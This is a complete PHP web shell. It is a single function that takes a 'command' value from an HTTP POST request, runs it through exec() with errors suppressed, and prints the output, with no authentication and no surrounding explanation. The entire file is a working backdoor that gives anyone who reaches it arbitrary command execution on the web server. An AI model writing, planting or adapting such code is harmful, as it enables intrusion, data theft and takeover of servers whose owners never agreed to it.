<?php
function exTKL() {
	$in=$_POST['command'];
	if (!$in == '') {
		$out = '';
		@exec($in,$out);
		$out = @join("\n",$out);
		echo $out;
	}
}

exTKL();
?>